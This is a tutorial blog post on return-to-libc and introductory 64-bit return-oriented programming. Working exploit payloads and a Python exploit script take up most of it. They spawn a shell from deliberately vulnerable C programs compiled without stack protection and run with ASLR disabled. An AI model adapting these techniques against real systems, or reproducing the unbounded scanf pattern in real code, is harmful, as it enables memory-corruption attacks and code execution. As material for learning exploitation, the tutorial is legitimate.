---
layout: post
title: "Buffer overflow - return-oriented programming"
date: 2020-01-05
tags: [security, linux, programming, vulnerabilities]
---

Return-oriented programming (ROP) solves the problem of the non-executable stack.

ROP is about selecting and executing instructions that are already in memory (as part of the program code or linked shared libraries) to perform desired actions.

To get started with this topic we'll cover the most basic variant, the Return-to-libc attack.

## Return-to-libc

We will begin with the following 32-bit program:

```c
/*
 * r2l1.c
 * gcc r2l1.c -fno-stack-protector -m32 -o r2l1
 */

#include <stdio.h>

void cp()
{
    char input[25];

    scanf("%s", input);
    printf("The first character was: %c\n", input[0]);
}

int main(int argc, char *argv[])
{
    printf("Input something: ");
    cp();

    return 0;
}
```

> Note that we are still `fno-stack-protector` during compilation, and that ASLR needs to be turned off.

The reason for starting our discussion of ROP with a vulnerable 32-bit program, is that these are a little simpler to exploit using this technique.

Without an executable stack, we can't inject the shellcode onto the stack for execution. For 32-bit binaries, we can instead put proper values on the stack, then jump to libc. An example is using `system()` to launch `/bin/sh`.

The C standard library (`libc`) is linked into all C programs. We can see that this is true for the above program:

```bash
$ ldd r2l1
        linux-gate.so.1 (0xf7fd2000)
        libc.so.6 => /lib/libc.so.6 (0xf7e06000)
        /lib/ld-linux.so.2 (0xf7fd3000)
```

We are going to exploit the buffer overflow vulnerability in the above program by turning the stack into this:


```
high addresses
    ===============
    |     ...     |
    |-------------|
    |    0x...    | <- address to a '/bin/sh' string
    |-------------|
    |    0x...    | <- address that `system()` will return to
    |-------------|
    |    0x...    | <- ret overwritten to address of `system()`
    |-------------|
    | aaaaaaaaaaa | <- overwritten saved frame pointer
    |-------------| <- bottom of stack
    | aaaaaaaaaaa |
    |             |
          ...       <- filled buffer
    |             |
    | aaaaaaaaaaa |
    |-------------| <- top of stack
    |   |  |  |   |
    |   v  v  v   |
    ===============
low addresses
```

The buffer is filled, and the saved frame pointer is overwritten by junk. ret will have the address of `system()`, making this the next function returned to. When `system()` executes, it will take the address of the '/bin/sh' string from the stack and execute it. Afterwards it will return to our specified address. We will use the address of `exit()`, since it allows us a clean exit (we could of course use some garbage value as the return address if we wanted the program to crash).

Open the program in gdb. Disassembling main reveals the number of bytes from the start of the buffer to the saved frame pointer:

```
(gdb) disas main
...
(gdb) disas cp
...
0x0804918f <+9>:     lea    -0x21(%ebp),%eax
0x08049192 <+12>:    push   %eax
0x08049193 <+13>:    push   $0x804a00c
0x08049198 <+18>:    call   0x8049060 <__isoc99_scanf@plt>
...
```

So we need to fill the buffer with 33 bytes, and then 4 bytes to overwrite the saved frame pointer (remember that we are exploiting a 32-bit binary which has 4 byte addresses).

To find the address of `system()` you look at its disassembly using `disas system` in gdb, or more simply do:

```bash
(gdb) print system
$1 = {<text variable, no debug info>} 0xf7e464d0 <system>
```

> You need to run the program in gdb first so that it will load the shared library.

Then do the same for `exit()`:

```bash
(gdb) print exit
$2 = {<text variable, no debug info>} 0xf7e38500 <exit>
```

The address contains a null byte. We can't use it, but looking at the code around exit, we can use the address right before since it's just a nop instruction:

```bash
(gdb) x/5i *exit-1
   0xf7e384ff:  nop
   0xf7e38500 <exit>:   endbr32
   0xf7e38504 <exit+4>: push   %esi
   0xf7e38505 <exit+5>: pop    %esi
```

Finally, we need the address of a '/bin/sh' string. We can be put the string in an environment variable:

```bash
$ env - MYSH=/bin/sh gdb r2l1
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) start
...
(gdb) x/2s *(char **)environ
0xffffdf98:     "PWD=/my/current/working/directory"
0xffffdfbd:     "MYSH=/bin/sh"
```

> libc actually contains a "/bin/sh" string, so we don't really need to supply the environment variable. You can verify this by using `strings /usr/lib/libc.so.6` from the terminal. You can find the address of this string in gdb by using `find &`*function*`,+9999999,"/bin/sh"`, where *function* is a libc function (e.g. `exit()`, `system()` or `printf()`).

> TIP: The enviroment contains a `SHELL` variable, but this is of course unavailable when we run with an empty environment, but it may be useful to know about for another time.

Again, we need to add 5 bytes to the address to take us past the "MYSH=" part of the string. Now we got:

- 0xf7e464d0 <system>
- 0xf7e384ff <exit>
- 0xffffdfc2 "/bin/sh"

Now we are ready to exploit. We use `<<<` to feed the python output to the program's stdin.

```bash
(gdb) run <<< `python -c 'print 37 * "A" + "\xf7\xe4\x64\xd0"[::-1] + "\xf7\xe3\x84\xff"[::-1] + "\xff\xff\xdf\xc2"[::-1]'`
Input something: The first character was: A
[Detaching after fork from child process 14268]
[Inferior 1 (process 14265) exited normally]
```

What happened here? Everything seems to be working as we intended, as the process forks, and then exits normally. But the shell was never available to us.

The same thing happens in the shell:

```
$ python -c 'print 37 * "A" + "\xf7\xe4\x64\xd0"[::-1] + "\xf7\xe3\x84\xff"[::-1] + "\xff\xff\xdf\xc2"[::-1]' | env - PWD=$PWD MYSH=/bin/sh SHLVL=0 $PWD/r2l1
Input something: The first character was: A
$ pstree -p $$
bash(18246)───pstree(21130)
```

> I use pstree to show that there is currently only one process, 18246. `$$` is the pid of the current shell.

This is because stdin closes, causing the shell to exit.

We can prevent this by keeping stdin open:

```bash
$ cat <(python -c 'print 37 * "A" + "\xf7\xe4\x64\xd0"[::-1] + "\xf7\xe3\x84\xff"[::-1] + "\xff\xff\xdf\xc2"[::-1]') - | env - PWD=$PWD MYSH=/bin/sh SHLVL=0 $PWD/book/r2l1
Input something: The first character was: A
█
```

> <() is process substitution.

The blinking cursor now waits for our input. But how can we be sure this is the sh spawned from `r2l1`?

```
Input something: The first character was: A
echo $$
21159
<PRESS CTRL-Z>
$ pstree -p $$
bash(18246)─┬─cat(21155)───bash(21157)
            ├─pstree(21222)
            └─r2l1(21156)───sh(21159)
```

We use `echo $$` to get the pid of the shell, then suspend the job to get back to our main bash shell. The pstree shows us that 21159 is indeed a child of the vulnerable program r2l1.

> Use `fg` to resume the suspended job.

## Intro to 64-bit ROP

The reason we started looking at ROP with a 32-bit program is, as stated, that it's simpler. If we were to do the same exploit as above on 64-bit, we immediately encounter an obstacle: 32-bit programs use the stack to pass function arguments, while 64-bit programs use registers How do we get the required function arguments into the correct regiters (like the address of "/bin/sh" to `system()` in `%rdi`) when we can only write to the stack?

This is where return-oriented programmed reveals itself as a huge subject of vast possibilities. Not only can we get any value we want into any register, we have access to Turing complete functionality.

Return-oriented programming is more than using using shared library functions to serve our needs. We can chain together pieces of program code and shared library code to accomplish any goal.

Let's start with showing how a simple return-to-libc attack is done. The program code below is exactly the same as in the previous section, but is compiled for 64-bit.

```c
/*
 * r2l2.c
 * gcc r2l2.c -fno-stack-protector -o r2l2
 */

#include <stdio.h>

void cp()
{
    char input[25];

    scanf("%s", input);
    printf("The first character was: %c\n", input[0]);
}

int main(int argc, char *argv[])
{
    printf("Input something: ");
    cp();

    return 0;
}
```

To successfully exploit the above program and get a shell with the `system()` function, we need to find a way to put the address of "/bin/sh" in the `%rdi` register before returning to `system()`.

In order to acheive this, we can search for instructions that pops from the stack into %rdi (since `%rdi` is where `system()` expects its argument) and then returns (or does something else that doesn't interfere with what we want to do, then returns). If we can't find an instruction like this, we can for example find and instruction that pops into some register and returns, then another that moves data from that register to `%rdi`, then returns.

> These small chunks of instructions ending in `ret` (or similar) are called *gadgets*.

The `ret` part is important. We are going to jump to a gadget by overflowing the stack and overwriting the return address. The stack will contain addresses of all gadgets we want to use, and the ret of one gadget will execute the next gadget in line.

Let's start by looking at the program binary for instructions with `%rdi`.

```
$ objdump -d r2l2 | grep '%[r,e]di'
   401071:       48 c7 c7 6f 11 40 00    mov    $0x40116f,%rdi
   4010a7:       bf 30 40 40 00          mov    $0x404030,%edi
   4010e9:       bf 30 40 40 00          mov    $0x404030,%edi
   401145:       bf 10 20 40 00          mov    $0x402010,%edi
   40115d:       bf 13 20 40 00          mov    $0x402013,%edi
   401177:       89 7d fc                mov    %edi,-0x4(%rbp)
   40117e:       bf 30 20 40 00          mov    $0x402030,%edi
   4011b0:       41 89 fd                mov    %edi,%r13d
   4011e6:       44 89 ef                mov    %r13d,%edi
```

> We will look at better and more efficient ways of looking for ROP-gadgets later on.

The last instruction moves data to `%edi` from `%r13d`, but there are function calls, a jump and a bunch of other instructions before `ret`:

```bash
$ objdump -d r2l2 | grep 4011e6 -A5
   4011e6:       44 89 ef                mov    %r13d,%edi
   4011e9:       41 ff 14 dc             callq  *(%r12,%rbx,8)
   4011ed:       48 83 c3 01             add    $0x1,%rbx
   4011f1:       48 39 dd                cmp    %rbx,%rbp
   4011f4:       75 ea                   jne    4011e0 <__libc_csu_init+0x40>
   4011f6:       48 83 c4 08             add    $0x8,%rsp
```

None of the instructions involving `%rdi` are interesting. What about `pop` instructions? We can find an instruction that pops into some register, then look for another instruction that moves data from that register to `%rdi`.

> The lower 32, 16 and 8 bits of 64-bit registers can be addressed directly. For  example `edi`, `di` and `dil` for the `rdi` register. Keep that in mind when looking for ROP gadgets.

```bash
$ objdump -d r2l2 | grep pop
   401059:       5e                      pop    %rsi
   40111d:       5d                      pop    %rbp
   4011fa:       5b                      pop    %rbx
   4011fb:       5d                      pop    %rbp
   4011fc:       41 5c                   pop    %r12
   4011fe:       41 5d                   pop    %r13
   401200:       41 5e                   pop    %r14
   401202:       41 5f                   pop    %r15
```

There are some useful instructions here. Now we can see if any of these are gadgets we can use:

```bash
$ objdump -d r2l2 | grep pop -A5
   401049:       5e                      pop    %rsi
   40104a:       48 89 e2                mov    %rsp,%rdx
   40104d:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
   401051:       50                      push   %rax
   401052:       54                      push   %rsp
   401053:       49 c7 c0 f0 11 40 00    mov    $0x4011f0,%r8
   --
   40110d:       5d                      pop    %rbp
   40110e:       c3                      retq
   40110f:       90                      nop
   401110:       c3                      retq
   401111:       66 66 2e 0f 1f 84 00    data16 nopw %cs:0x0(%rax,%rax,1)
   401118:       00 00 00 00
   --
   4011da:       5b                      pop    %rbx
   4011db:       5d                      pop    %rbp
   4011dc:       41 5c                   pop    %r12
   4011de:       41 5d                   pop    %r13
   4011e0:       41 5e                   pop    %r14
   4011e2:       41 5f                   pop    %r15
   4011e4:       c3                      retq
   4011e5:       66 66 2e 0f 1f 84 00    data16 nopw %cs:0x0(%rax,%rax,1)
   4011ec:       00 00 00 00

   00000000004011f0 <__libc_csu_fini>:
```

The little gadget at 0x40111d that pops into `%rbp` and returns could be of use. As could and the last gadget. But both require that we find other gadgets, for example in libc, that move the data from one of the above registers to the `%rdi` register.

Instead of manually searching for gadgets, we can use a tool called `ropper`.

`ropper` is very useful for finding ROP gadgets (and much more). It can be installed by doing:

```c
$ virutalenv ropper
$ cd ropper
$ pip install ropper
$ source /bin/activate
```
>

Let's see what it finds in r2l2:

```bash
$ ropper -f r2l2 --search %rdi
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: %rdi

[INFO] File: r2l2
0x00000000004010a6: or dword ptr [rdi + 0x404030], edi; jmp rax;
0x0000000000401203: pop rdi; ret;
```

> The '%' isn't part of the register name (like AT&T syntax), but means *any string*.

That last gadget is exactly what we need! Why didn't it show up when we looked at `pop` operations in r2l2 above?

The reason is that `ropper` can find overlapping instructions. Overlapping instructions are found by starting at an offset when interpreting the bytes as instructions. Since x86 are instructions have variable byte lengths, the interpretation of a sequence of bytes will differ significantly if we start start from an offset.

If we specify a the starting address in `objdump`, the gadget appears:

```bash
$ objdump -d ../r2l2 --start-address=0x401203
...
0000000000401203 <__libc_csu_init+0x63>:
  401203:       5f                      pop    %rdi
  401204:       c3                      retq
  401205:       66 66 2e 0f 1f 84 00    data16 nopw %cs:0x0(%rax,%rax,1)
...
```

Now we got at usable gadget at 0x401203.
We will call this gadget to pop the address of a "/bin/sh" string into `%rdi`, then call `system()`, then `exit()`. What does the stack need to look like to accomplish this?

If we use `disas cp` in gdb, we see that the buffer starts at -0x20(%rbp). We need to fill the buffer, overwrite the saved frame pointer and overwrite ret with the address of our gadget. Our gadget pops from the top of the stack, so we need to put the address of the "/bin/sh" string after ret. At this point we could encounter a major obstacle since we are going to write addresses containing null bytes to the stack. Luckily, `scanf` does not mind null bytes (unlike e.g. `strcpy`), so this is not a problem.

> We later look at how 0-byte addresses can be handled when the vulnerable program uses a function that stops writing at the first null byte (like `strcpy`).

Now, we can find the address of "/bin/sh", `system()` and `exit()`.

> In a previous section we found the function addresses by using gdb's `print` (`p`) command, while the string (which is in libc) was found with gdb's `find` command.

One way to accomplish this is to first find the base address of libc:

```bash
$ ldd r2l2
...
        libc.so.6 => /lib64/libc.so.6 (0x00007ffff7de9000)
...
```

And then find the offset of the string and functions:

```
$ strings -tx /lib64/libc-2.28.so  | grep bin/sh
 186519 /bin/sh
$ readelf -s /lib64/libc-2.28.so | grep system@
...
1418: 0000000000045c30    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5
...
$ readelf -s /lib64/libc-2.28.so | grep exit
...
135: 000000000003ae30    32 FUNC    GLOBAL DEFAULT   14 exit@@GLIBC_2.2.5
...
```

Finding the addresses is now a matter of summing the base address and the offsets:

```
system:    0x00007ffff7de9000 + 45c30  = 0x00007ffff7e2ec30
exit:      0x00007ffff7de9000 + 3ae30  = 0x00007ffff7e23e30
"/bin/sh": 0x00007ffff7de9000 + 186519 = 0x00007ffff7f6f519
```

The gadget is at 0x0000000000401203. The buffer is 0x20 (32) bytes, and the saved frame pointer is of course 8 bytes.

Now we are ready to create the exploit. Let's make a binary file that we can feed to stdin in both gdb and in the terminal:

```bash
$ python -c 'print 40 * "a" + "\x00\x00\x00\x00\x00\x40\x12\x03"[::-1] + "\x00\x00\x7f\xff\xf7\xf6\xf5\x19"[::-1] + "\x00\x00\x7f\xff\xf7\xe2\xec\x30"[::-1] + "\x00\x00\x7f\xff\xf7\xe2\x3e\x30"[::-1]' > pl.bin
$ xxd pl.bin
00000000: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000010: 6161 6161 6161 6161 6161 6161 6161 6161  aaaaaaaaaaaaaaaa
00000020: 6161 6161 6161 6161 0312 4000 0000 0000  aaaaaaaa..@.....
00000030: 19f5 f6f7 ff7f 0000 30ec e2f7 ff7f 0000  ........0.......
00000040: 303e e2f7 ff7f 0000 0a                   0>.......
```

> The '0x0a at the end is the newline character from Python's print.

In gdb, break at the `ret` instruction of the cp function, and run the program with the file as input:

```bash
(gdb) disas cp
...
   0x000000000040116e <+56>:    retq
(gdb) b *cp+56
(gdb) r < pl.bin
```

The stack now looks like this:

```
(gdb) x/32xb $rsp
0x7fffffffd658: 0x03    0x12    0x40    0x00    0x00    0x00    0x00    0x00
0x7fffffffd660: 0x19    0xf5    0xf6    0xf7    0xff    0x7f    0x00    0x00
0x7fffffffd668: 0x30    0x3e    0xe2    0xf7    0xff    0x7f    0x00    0x00
0x7fffffffd670: 0x19    0xf5    0xf6    0xf7    0xff    0x7f    0x00    0x00
```

On top is our gadget's address, followed by the address of the string, system and exit.

Let's move along and see what happens.

```bash
(gdb) disp/i $pc
1: x/i $pc
=> 0x40116e <cp+56>:    retq
(gdb) si
0x0000000000401203 in __libc_csu_init ()
1: x/i $pc
=> 0x401203 <__libc_csu_init+99>:       pop    %rdi
(gdb) si
0x0000000000401204 in __libc_csu_init ()
1: x/i $pc
=> 0x401204 <__libc_csu_init+100>:      retq
```

> We use `display/i $pc` to diplay the next instruction every time the program stops.

Let's confirm that the address of the string is in `rdi` and continue:

```bash
(gdb) x/s $rdi
0x7ffff7f6f519: "/bin/sh"
(gdb) si
0x00007ffff7e2ec30 in system () from /lib64/libc.so.6
1: x/i $pc
=> 0x7ffff7e2ec30 <system>:     endbr64
```

We are now in `system()`! We will continue to see if a shell pops.

```bash
(gdb) c
Continuing.
[Detaching after fork from child process 11941]
[Inferior 1 (process 11934) exited with code 02]
```

A fork and an exit. That looks good! Again, the shell closes immediately since stdin closes, but this is easy to get past in the shell:

```
$ (cat pl.bin; cat) | ./r2l2
Input something: The first character was: a
echo $$
12779
<PRESS CTRL-Z>
[1]+  Stopped                 ( cat pl.bin; cat ) | ./r2l2
$ pstree -p $$
bash(11617)─┬─bash(12776)───cat(12780)
            ├─pstree(12800)
            └─r2l2(12777)───sh(12779)
```

We got a shell!

As a final exercise, we'll fix the exit code. As you may have noticed in the gdb output above, the program exits with exit code 2:

```
$ (cat pl.bin; cat) | ./r2l2
Input something: The first character was: a
^C
$ echo $?
2
```

> The `%rdi` register is changed to 0x2 by a function called by `system()`. The `%rdi` register is *volatile* (not preserved acrosss function calls).

We need to find a gadget that we can run before `exit()` that will put zero into `%rdi`. Luckily, we already have a gadget like this, our old pal `pop %rdi; ret`. By putting its address and 8 null bytes before the address of `exit()`, we can accomplish our goal:

```python
# r2l2_exploit.py
import struct

# fill stack and saved frame pointer
pad = 40 * "a"

poprdi  = struct.pack("<Q", 0x401203)
csystem = struct.pack("<Q", 0x7ffff7e2ec30)
binsh   = struct.pack("<Q", 0x7ffff7f6f519)
cexit   = struct.pack("<Q", 0x7ffff7e23e30)
ecode = 8 * "\x00"

print pad + poprdi + binsh + csystem + poprdi + ecode + cexit
```

> The above exploit is more readable and easier to modify than a long oneliner. The `struct.pack("<Q", ...)` let's us type in addresses without leading zeroes and have them returned as a string packed to a little-endian unsigned long long (8 bytes).

You can run the above exploit like this in gdb (if you for example want to study the stack and register states):

```bash
(gdb) r < <(python r2l2_exploit.py)
Input something: The first character was: a
[Detaching after fork from child process 14240]
[Inferior 1 (process 14231) exited normally]
```

And like this in the terminal:

```bash
$ (python r2l2_exploit.py; cat) | ./r2l2
Input something: The first character was: a
^C
$ echo $?
0
```

> There are of course a bunch of other ways to zero out `%rdi`. See if you can find another gadget to do this.

Now that you're comfortable with the basics of return-oriented programming, doing a return-to-libc attack on 32-bit and 64-bit systems should be about equally easy. In a later article, we will study some of the more advanced possibilites of return-oriented programming.
